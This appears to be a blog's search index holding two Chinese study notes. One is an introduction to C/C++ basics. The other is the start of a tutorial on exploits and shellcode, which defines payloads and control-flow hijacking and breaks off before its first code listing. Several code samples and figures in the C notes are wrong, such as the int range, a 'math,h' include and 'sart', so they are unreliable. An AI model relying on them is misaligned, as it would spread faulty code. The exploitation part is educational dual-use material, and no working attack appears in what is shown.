<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>C&amp;C++(1)——基础概念</title>
      <link href="/2025/12/15/C&amp;C++%EF%BC%881%EF%BC%89%E2%80%94%E2%80%94%E6%A6%82%E5%BF%B5%E5%85%A5%E9%97%A8/"/>
      <url>/2025/12/15/C&amp;C++%EF%BC%881%EF%BC%89%E2%80%94%E2%80%94%E6%A6%82%E5%BF%B5%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="C-C-（1）——概念入门"><a href="#C-C-（1）——概念入门" class="headerlink" title="C&amp;C++（1）——概念入门"></a>C&amp;C++（1）——概念入门</h1><blockquote><p>对于这门编程语言，我主要基于肖乐意教授的讲解结合<a href="http://www.silencer76.com/strl/%E8%BF%9B%E8%A1%8C%E5%AD%A6%E4%B9%A0%E3%80%82">http://www.silencer76.com/strl/进行学习。</a></p></blockquote><h2 id="什么是程序设计语言"><a href="#什么是程序设计语言" class="headerlink" title="什么是程序设计语言"></a>什么是程序设计语言</h2><ul><li>系统软件：管理计算机的各种资源（操作系统，语言处理程序等）；</li><li>应用软件：专为实现某一应用开发的软件（QQ,WeChat等）；</li><li>软件&#x3D;程序（为完成特定任务而用某种语言编写的一组指令序列）＋文档＋数据；</li><li>程序设计语言分为：机器语言（计算机直接识别和执行，可读性差），汇编语言（加入助记符的二进制编码，通过Assembler转换为机器指令执行）和高级语言（易于学习和编程，编写成的程序成为源程序）;</li><li>源程序通过compiler翻译为机器语言（目标程序）执行，目标程序与支持库代码连接构成可执行文件（.exe）</li><li>C++语言特点：简洁高效，功能强（<strong>在C语言基础上增加了面向对象机制</strong>）</li><li>C语言特点：结构化与模块化（面向过程）</li><li>程序设计过程：问题分析→算法设计→编写程序（对算法的具体描述）→运行调试（先编译后执行）→文档编写</li></ul><h2 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h2><blockquote><p>所有变量在使用前都需要定义，包括类型和变量名<code>int a</code>，</p><p><em>变量名的第一个字符只能是下划线或者字母</em></p></blockquote><ul><li><p><code>//</code>单行注释；  <code>/* */</code>多行注释；<code>contol+/</code>可对多行同时加注释，再按可取消</p></li><li><p><code>#</code>预处理指令，类似于Python语言中的import 起到导入函数库的作用，在C语言中<code>#include&lt;stdio.h&gt;</code>中**.h**意味着导入头文件；C++中则是<code>#include&lt;iostream&gt;</code></p></li><li><p><code>int main</code>与<code>return 0</code>相对应，在一个程序中必须但也只能有一个以main命名的主函数；<code>;</code>是一条语句的终止符，每条可执行语句必须以此结束；</p></li><li><p>C语言中用<code>printf</code>格式化输出函数，<code>\n</code>换行，不过在C++中则用<code>cout&lt;&lt;&quot;s=&quot;&lt;&lt;s</code>输出（成为输出流），用<code>endl</code>来换行；</p></li><li><p><code>int</code>可用于定义整数&amp;整数变量；<em>（定义多个同类型变量可用”,”连接）</em>；</p></li><li><p>对于C语言的<code>scanf(&quot;%d&quot;,&amp;a);</code>中，<code>scanf</code> 用于获取键盘输入信息，<code>%</code>后加格式控制符，<code>d</code>表示一个十进制的整型数据，&amp;表示输入值归属于哪个变量（只有在scanf函数中＋&amp;是这意思），a对应前面定义的变量；<strong>不要忘记“显示内容”</strong>；如果是C++,使用cin来进行输入，常为<code>cin&gt;&gt;a&gt;&gt;b</code>（也称为输入流）。</p></li><li><p>函数体用**{}**括起来；</p></li></ul><blockquote><p>通过函数形式封装可重复使用并且使得程序功能更清晰，但需在主程序起始声明（<code>void</code>+函数）</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*这是一个最简单的C++程序*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span>        <span class="comment">//使用C++的命名空间</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Hello!&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>[!NOTE]</p><p>C++标准库的类和函数是在命名空间std中声明的，如果源程序中使用到了标准库1里的有关内容就需要使用<code>using namespace std;</code>来做声明，否则会报错；</p><p>命名空间的来源是由于避免多团队开发时发生变量重名而提出的概念，一般有输入&#x2F;输出的信息都要用iostream库中的预处理指令来提供cin&#x2F;cout这些指令，也就要进行声明了。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*这是一个基本的C语言程序*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义主函数main（）</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">comparing</span><span class="params">(<span class="type">int</span> x)</span></span>;<span class="comment">//函数comparing声明</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">max</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span>;<span class="comment">//函数max声明</span></span><br><span class="line">    <span class="type">int</span> a,b;              <span class="comment">//定义两个整数变量</span></span><br><span class="line">    <span class="type">int</span> sum;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入第一个整数：\&quot;\&quot;&quot;</span>);<span class="comment">//加反斜杠做转义符使其只是&quot;</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入\n第二个变量：&quot;</span>);<span class="comment">//\n表示换行</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;b);</span><br><span class="line">    sum=a+b;</span><br><span class="line">    <span class="built_in">comparing</span>(sum);</span><br><span class="line">    <span class="built_in">max</span>(a,b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">comparing</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">max</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​        对程序进行简单总结，可将其概括为3个部分：预处理指令+全局声明部分+函数（实现操作）；而函数除函数名外，则由函数首部<code>()</code>和函数体<code>&#123;&#125;</code>（局部声明＋执行部分）来构成；我们允许一个函数没有声明和执行，即作为一个空函数（这是合法的）；</p><p>而语句通常分为<strong>声明语句</strong>（用于提供定义）和<strong>执行语句</strong>（用于实现指定操作）；</p><p>在函数的实际执行过程中会从main函数开始执行并在其中结束执行，其余的函数需在其中进行调用。</p><p>正如之前所说，<strong>类</strong>是C++相较于C的最重要发展，通过类的引入，我们可实现面向对象程序设计的封装、继承和派生等功能，一个类中可包含数据成员和成员函数并被分为私有（仅能被本类成员函数调用）&#x2F;公有属性。</p><p>C++程序在书写上相对更自由，不过为了程序清晰，我们一行只写一个语句就好了，加上注释也更方便阅读（但要注意C++中对大小写是会区分的，h与H并不能认定为同一个变量）；</p><p>程序设计错误原因分为三种：</p><ul><li>语法错误：编译器报错；</li><li>运行错误：由于某种意外（进程冲突等）导致程序非正常终止；</li><li>逻辑错误：程序可正常运行但结果非预期。</li></ul><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>数据（计算机处理的主要对象）存在的形式，作为数据的一种属性，我们通过声明不同的数据类型告知编译器&#x2F;解释器如何使用数据。数据类型决定着数据占内存的字节数、数据的取值范围以及在其上可进行的操作。</p><blockquote><p>对于正数来说，正，原，补码相同；对于负数，其补码等于绝对值后的反码加1；</p><p>字节&#x2F;比特，是数据存储的单位——1B&#x3D;8bit（位数）</p></blockquote><p>常见的数值转换(用于表示存储大小，就像手机内存大小啥的)</p><table><thead><tr><th>1K</th><th>2^10 B</th></tr></thead><tbody><tr><td>1M</td><td>2^10 K</td></tr><tr><td>1G</td><td>2^10 M</td></tr><tr><td>1T</td><td>2^10 G</td></tr></tbody></table><p>相较于C语言，C++中新增了<code>长双精度类型</code>（<code>long double</code>）以及派生的<code>类</code>类型（<code>class</code>）；此外我们用布尔型<code>bool</code>表示逻辑判断型，空类型<code>void</code>表示无值型。</p><table><thead><tr><th align="center">类  型</th><th align="center">字节数</th><th align="center">位  数</th><th align="center">取值范围</th></tr></thead><tbody><tr><td align="center">int（<em>用于表示整型数字</em>）</td><td align="center">4</td><td align="center">32</td><td align="center">-2147483~2147483647</td></tr><tr><td align="center">unsigned int</td><td align="center">4</td><td align="center">32</td><td align="center">0~4294967295</td></tr><tr><td align="center"><strong>short</strong>（短整型）</td><td align="center">2</td><td align="center">16</td><td align="center">-32768~32767(2^15-1)</td></tr><tr><td align="center">unsigned short</td><td align="center">2</td><td align="center">16</td><td align="center">0~65535（2^16-1）</td></tr><tr><td align="center">long(对于long类型来说，在32位的系统中的大小还是4B取值范围也和int一样，不过现在大部分已经是64位系统了)</td><td align="center">8</td><td align="center">64</td><td align="center">-9.2×10^18~9.2×10^18</td></tr><tr><td align="center">unsigned  long</td><td align="center">8</td><td align="center">64</td><td align="center">0~18446744073709551615</td></tr><tr><td align="center"><strong>char</strong>（字符型，表示字母数字等）</td><td align="center">1</td><td align="center">8</td><td align="center">-128~127</td></tr><tr><td align="center">unsigned char</td><td align="center">1</td><td align="center">8</td><td align="center">0~255</td></tr><tr><td align="center">float（6位有效数字）</td><td align="center">4</td><td align="center">32</td><td align="center">-3.4×10^-33~3.4×10^33</td></tr><tr><td align="center">double（15位有效数字）</td><td align="center">8</td><td align="center">64</td><td align="center">-1.7×10^-308~1.7×10^308</td></tr><tr><td align="center">long double（在linux环境下其取值范围可变大到128位）</td><td align="center">8</td><td align="center">64</td><td align="center">-1.7×10^-308~1.7×10^308</td></tr></tbody></table><p>​        其实在C++中并没有严格规定每一种数据所占的字节数，只规定int型所占字节数须在long和short之间（由于短型在存储空间上只占一般型的一半，所以在其取值范围内使用短型可以节省存储空间提升效率）；</p><p>数据一般以补码形式存放，最高位表示符号，但对于指定为unsigned的数据，全部位数都用于表示数值本身。因此若存储的数据类型没有负值的话用unsigned型可以扩大存储范围。</p><h4 id="对于浮点型数据"><a href="#对于浮点型数据" class="headerlink" title="对于浮点型数据"></a>对于浮点型数据</h4><p><code>float</code>(4byte单精度浮点数类型，可<strong>精确到小数点后6位</strong>,超过六位会四舍五入截断)，对应<code>%f</code> ,精确到4位可写<code>%.4f</code>;</p><p><code>double</code>（8byte双精度类型，可<strong>精确到小数点后十二位</strong>），对应<code>%lf</code>，如果要精确到十位可写<code>%.10lf</code>;</p><p>在C语言中我们用<code>printf</code>类函数来做格式化输出，<code>%c</code>按字符输出，<code>\n</code>表示换行，<code>\a</code>响铃，<code>\b</code>退格（将光标后退一位），<code>\r</code>不换行回到本行开始位置，123.45E+5 &#x3D; 123.45 * 10的5次；<code>%e</code>或<code>%E</code>则表示用指数形式输出结果；<code>%f</code>表示用小数形式；<code>%g</code>将自动输出前两者中宽度较短的结果；<code>%s</code>输出字符串；<code>%o</code>无符号八进制输出,<code>%u</code>无符号十进制输出结果,<code>%x</code>无符号十六进制输出结果对于<code>%4d</code>当使用键盘输入12345时，系统将按照格式控制自动截取前4个数字存入变量中</p><p>关于<code>printf</code>函数输出解释</p><!--当出现字符超出取值范围时，会出现错误，或得到一个不可预测的替代字符--><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//主函数引入</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> q=<span class="number">0</span>;</span><br><span class="line">    p=q;<span class="comment">//替换变量</span></span><br><span class="line">    q=<span class="number">24</span>;<span class="comment">//重新赋值</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c=%c\n&quot;</span>,c);   <span class="comment">//输出单个字符</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;d=%-3c\n&quot;</span>,d); <span class="comment">//左端对齐，宽度3列，右补2格</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;e=%4c\n&quot;</span>,e);  <span class="comment">//右端对齐，宽度4列，左补3格</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%zu\n&quot;</span>,<span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;             <span class="comment">//程序成功运行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>​       常量的值不能改变，常见的可分为三种：数值型、字符型（用两个单引号包含）和字符串型（用双引号包含）。</p><h4 id="数值常量-a-b都是变量，等号右侧的是常量"><a href="#数值常量-a-b都是变量，等号右侧的是常量" class="headerlink" title="数值常量(a,b都是变量，等号右侧的是常量)"></a>数值常量(a,b都是变量，等号右侧的是常量)</h4><p>用于区分类型，以便于在赋值时或函数进行参数的虚实结合式匹配数据类型。例如</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">short</span> a = <span class="number">50000</span>;  <span class="comment">//√    </span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> b = <span class="number">80000</span>;  <span class="comment">//×   ；因为unsigned short的取值范围为0~65535</span></span><br></pre></td></tr></table></figure><p>对于整型的常量我们通常有三种进制表示方式：十进制（d）,八进制（在常熟开头加数字0，表示以八进制形式进行表示），十六进制（在常数开头前加0x）。</p><p>对于浮点型数据C++一般默认按照<code>double</code>类型进行存储</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*直接按照小数形式写入*/</span></span><br><span class="line"><span class="type">int</span> a = <span class="number">2.444</span>;</span><br><span class="line"><span class="type">float</span> b = <span class="number">35.6262727267</span>;</span><br><span class="line"><span class="type">double</span> c = <span class="number">59.672949442</span>;</span><br><span class="line">cout&lt;&lt;a&lt;&lt;endl;   <span class="comment">//输出2，警告：从double转int，可能丢失数据</span></span><br><span class="line">cout&lt;&lt;b&lt;&lt;endl;   <span class="comment">//输出35.6262 警告：从double转float ，可能丢失数据</span></span><br><span class="line">cout&lt;&lt;c&lt;&lt;endl;   <span class="comment">//输出59.6729  cout默认最多输出6位有效数字</span></span><br></pre></td></tr></table></figure><p>我们也可以将浮点数写成指数形式，例如对于0.5442可以写成54.42×10^-2，在程序中我们可以表示为54.42e-2（e表示以10为底）；其实无论是小数还是指数形式最终在内存中都会以指数形式进行存储，对于数字部分的规格化表示其小数点后第一个数字必须非0.</p><table><thead><tr><th>+（数符）</th><th>.545422（数字部分）</th><th>4（指数部分）</th></tr></thead></table><h4 id="字符常量"><a href="#字符常量" class="headerlink" title="字符常量"></a>字符常量</h4><p>在内存中占1个字节，如’a’,’%’,’D’等（只包含一个字符，用于区分大小写字符，’AB’就不是）；字符常量会对大小写字母做区分，其中 ‘ 是定界符，不属于字符常量的一部分，例如<code>cout&lt;&lt;&#39;a&#39;</code>会输出字符a。</p><p>在C++中转义字符与C中的基本相同不过对于“\n”这样输出一个换行，不如直接用<code>cout&lt;&lt;endl</code>这样来换行，此类控制字符是对于输出设备透明的，如果我们想正常输出一个单双引号，直接在他们前面加一个反斜杠就好了。</p><p><code>\101</code>：（反斜杠后的三位）以八进制形式的ASCII码对应的字符，因为（101）8&#x3D;（65）10，那这样就会输出其对应的字符A；但注意<code>\0</code>是输出一个空字符的意思；</p><p><code>\x31</code>：（\x后的两位）以十六进制形式对应的ASCII码对应的字符，因为(31)16&#x3D;(49)10，查表可知会输出对应的字符0.</p><p>转义字符也代表一个字符，因此会在内存中占用一个字节；当我们将字符常量存放到内存单元时，实际上是将该字符相应的ASCII值放入存储单元，例如存入一个a，那么实际上是存放的ASCII码值97（不过是以2进制形式来表示的）。若对字符数据进行算术运算，其实际上也是对ASCII码做运算；其实我们也可以将一个ASCII码数值范围在0~255的字符数据用int来表示，不过会占用更大内存空间？（我瞎猜的），一般直接<code>char a</code>这样表示就好了。（因为大小写字母在表中差32，因此我们也可以这样做大小写转换）</p><h4 id="字符串常量"><a href="#字符串常量" class="headerlink" title="字符串常量"></a>字符串常量</h4><p>用双引号括起来的字符序列，每个字符串会自带一个占1字节的字符串结束标志<code>\0</code>（但不会实际输出）。（例如“abc”在内存中占4个字节），因此在实际应用时需要注意“a”占2字节，但是‘a’占1字节（比如char c;  c&#x3D;”a”，就会报错，因为char只能容纳1字节）。</p><h4 id="符号常量（宏常量）"><a href="#符号常量（宏常量）" class="headerlink" title="符号常量（宏常量）"></a>符号常量（宏常量）</h4><p>为了方便表示，我们也可以使用一个符号名(一般用大写字符，放开头，因为通常是全局的)来代表一个常量，例：<code>#define PRICE 25</code>（后不加分号），这样在之后使用的时候就可以直接<code>sum = num *PRICE</code>，需要注意的是，如果我们已经在之前声明了这个符号，那么之后我们就不能再去对其进行赋值；</p><p><strong>它不会像变量那样占用内存地址，只是在编译前把代码里所有宏名替换成对应值</strong></p><p>使用符号常量好处在于含义清晰（不过尽量只对特殊的量去这样定义，太多符号常量挺乱的），方便修改（如果有多处用到的话，这样改一个地方就可以了）</p><blockquote><p>[!NOTE]</p><p>诚如之前所说cout会默认对浮点数输出精度为6位，我们可以通过引入<iomanip>库来实现对其的精度控制，<code>cout&lt;&lt;fixed&lt;&lt;setprecision(2)&lt;&lt;a&lt;&lt;endl;</code>因为是从右往左输出；<code>fixed</code>是让a里的浮点数全部展开，之后通过<code>setpresicion()</code>来实现具体输出的位数控制。</p></blockquote><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>我们说变量其实就是一个盒子，用于存放数据，在输出时就把盒子里的数据给出去。</p><p>​      对于变量名的命名规则有：不能是C++原本就有的关键字（比如int），大小写字母是被区分的，必须以字母&#x2F;下划线开头，但是整体组成可以由字母&#x2F;下划线&#x2F;数字来组成。常用的命名方式主要有studentName（骆驼表示法）和iCount（匈牙利变量命名法，即加一个变量类型的表示）。</p><p>​        对于变量我们要先定义才能用；对于同一类型的多个变量声明我们可以用逗号分隔开。（变量只有声明了确定类型才能在编译时被分配相应的存储单元），我们可以给变量在定义时直接赋予一个初始值，没被赋值的变量其输出结果不可预测，当然我们也可以<code>cin&gt;&gt;a</code>这样，在输入时给它赋值</p><h5 id="常变量"><a href="#常变量" class="headerlink" title="常变量"></a>常变量</h5><p>​       即在变量前加<code>const</code>这类变量的值在程序的运行期间是不能改变的，且在定义时就必须给一个初始值；不过常变量是不能再被赋值的，只能在对其定义的地方改；</p><p>​        宏常量和常变量的区别就在于常变量有具体类型，且可在函数中去定义。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> a;</span><br><span class="line">a = <span class="number">2</span>;             <span class="comment">//不合法</span></span><br></pre></td></tr></table></figure><h2 id="运算符与表达式"><a href="#运算符与表达式" class="headerlink" title="运算符与表达式"></a>运算符与表达式</h2><p>C++的运算符种类很多可分为算术运算符、关系运算符和逻辑运算符等等</p><h4 id="基本运算符"><a href="#基本运算符" class="headerlink" title="基本运算符"></a>基本运算符</h4><table><thead><tr><th>+</th><th>加</th></tr></thead><tbody><tr><td>-</td><td>减</td></tr><tr><td>*</td><td>乘</td></tr><tr><td>&#x2F;</td><td>除</td></tr><tr><td>%</td><td>取余（常用于判断奇偶或取模运算）</td></tr></tbody></table><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*在实际应用中需引用cmath库*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="comment">/*用于取模的示例*/</span></span><br><span class="line"><span class="type">int</span> k,n=<span class="number">10</span>;</span><br><span class="line">k=(<span class="number">6</span>+n)%<span class="number">7</span>;</span><br><span class="line">cout&lt;&lt;k;</span><br></pre></td></tr></table></figure><p>在算术运算中，我们可以用括号来提高运算优先级，同时如果有一个数是float型或double型，那么结果就是<code>double</code>型；所谓运算的结合性就是说这个运算方向是从右到左（左侧有＝号的）还是从左到右（左结合，一般的）</p><p>在不同数据类型进行运算时会进行类型转换（在表达式中程序会自动转换类型，也叫隐式类型转换）：</p><ul><li><p>char&#x2F;short→int→unsigned→long→double</p></li><li><p>float→double</p></li><li><p>若需要强制转换类型，即<code>b=(int)a%3;</code>（c语言形式）&#x2F;<code>b=int(a)%3;</code>(C++类型)这样先将a的值转换为整型，再➗3取余。这样的强制转换不会改变原来变量的值和类型，只用于当前的运算。</p></li><li><p>对于赋值运算符<code>=</code>其左侧必须是单个变量，用于表示将右边表达式的值赋给左侧变量。（当然赋值前也会自动进行类型转换以匹配，若要将double型转成float型需要注意数值范围的溢出风险，末尾加分号形成一条完整语句，不加分号不能单独使用）</p><blockquote><p>对于逻辑运算符：<strong>！(逻辑非)<strong>，自增&#x2F;自减运算符&gt;算术运算符&gt;关系运算符&gt;</strong>&amp;&amp;(逻辑与)</strong>&gt;<strong>||(逻辑或)</strong>&gt;赋值运算符</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">a += <span class="number">8</span>; </span><br><span class="line">cout&lt;&lt;a;     <span class="comment">//输出结果为105     因为&#x27;a&#x27;的ASCII码是97，加8后输出</span></span><br></pre></td></tr></table></figure></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*这是一个C语言的示例*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math,h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>+<span class="number">3</span>*<span class="number">5</span>      <span class="comment">//运算表达式</span></span><br><span class="line">a=<span class="number">3</span>*<span class="number">4</span>      <span class="comment">//赋值表达式</span></span><br><span class="line">b=<span class="number">3</span>/<span class="number">4</span>      <span class="comment">/*在运算中结果类型会同输入类型，因此要想此步结果不为0，则此步骤输入的计算数字也要换为浮点数类型*/</span></span><br><span class="line">-a+<span class="number">1</span>；     <span class="comment">//语句  语句！=表达式，因为有;号</span></span><br><span class="line"><span class="number">7</span>%<span class="number">4</span>        <span class="comment">//%号，取余数，连接的两个数字必须为整型数据，±同符号前数字</span></span><br><span class="line">a*=<span class="number">3</span>       <span class="comment">//等价于a=a*3</span></span><br><span class="line">sart(<span class="number">9</span>);   <span class="comment">/*计算9的平方根*/</span></span><br><span class="line"><span class="built_in">log</span>(x);      <span class="comment">//求的ln</span></span><br><span class="line"><span class="built_in">fabs</span>(x);    <span class="comment">//取绝对值</span></span><br><span class="line"><span class="built_in">pow</span>(x,y);  <span class="comment">/*用于计算x的y次方,可以在官方库上面做实现*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*使用布尔类型时*/</span></span><br><span class="line"><span class="string">&#x27;a&#x27;</span>==<span class="string">&#x27;b&#x27;</span>; <span class="comment">//等于</span></span><br><span class="line"><span class="string">&#x27;a&#x27;</span>!=<span class="string">&#x27;b&#x27;</span>; <span class="comment">//不等于</span></span><br><span class="line"><span class="string">&#x27;a&#x27;</span>&gt;=<span class="string">&#x27;b&#x27;</span>; <span class="comment">//大于等于</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>自增运算<code>i++</code>可用于替换<code>i=i+1</code>语句来提高运算速度；</p></li><li><p>自减运算<code>i--</code>同理（这些都属于后置，即先使用变量，之后自身再加减；前置就是先加减，再使用，比如<code>--i</code>）。</p><p>​       但它俩只能用于变量而不能用于表达式或常量在运算时用右结合。</p><h4 id="逗号运算符"><a href="#逗号运算符" class="headerlink" title="逗号运算符"></a>逗号运算符</h4><p>C++特有的，即用逗号把两个表达式<code>表达式1，表达式2；</code>连接起来（求解顺序为从左到右），最终整个表达式的值是表达式2的结果，不过其在在所有运算符中优先级最低，因此<code>a=4*5,a*6</code>就先算a&#x3D;&#x3D;20，再做20*6&#x3D;&#x3D;120，然后输出。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Programme Language </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C&amp;C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞利用——从shellcode 到安全防护</title>
      <link href="/2025/12/10/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E2%80%94%E2%80%94%E4%BB%8Eshellcode%E5%88%B0%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/"/>
      <url>/2025/12/10/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E2%80%94%E2%80%94%E4%BB%8Eshellcode%E5%88%B0%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ul><li>Exploit（漏洞利用）——指利用已有漏洞进行尝试&#x2F;发起实质攻击。</li></ul><p>​        其核心就在于利用程序漏洞去劫持进程的控制权，实现控制流劫持，以便执行植入的shellcode或者达到其它目的。早期攻击通常采用代码植入（上载一段代码，控制进程转向这段代码去执行，即劫持了进程的控制权）的方式，但是我们通常把它作为一个攻击动作的统称，实际动作还是看结构里的东西。</p><blockquote><p>有漏洞不一定就有Exploit，因为其相较于vulnerable需要具备可行性</p></blockquote><ul><li><p>Shellcode  在广义上表示为植入进程的代码</p></li><li><p>Exploit结构：</p><table><thead><tr><th>payload（触发漏洞，转移控制权）</th><th>Shellcode</th></tr></thead><tbody><tr><td>负责包含shellcode，并加壳（以触发漏洞并让系统&#x2F;程序执行shellcode）</td><td>用来实现具体功能</td></tr></tbody></table><h3 id="Shellcode植入"><a href="#Shellcode植入" class="headerlink" title="Shellcode植入"></a>Shellcode植入</h3><p>以一个含验证过程漏洞的程序案例展开，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 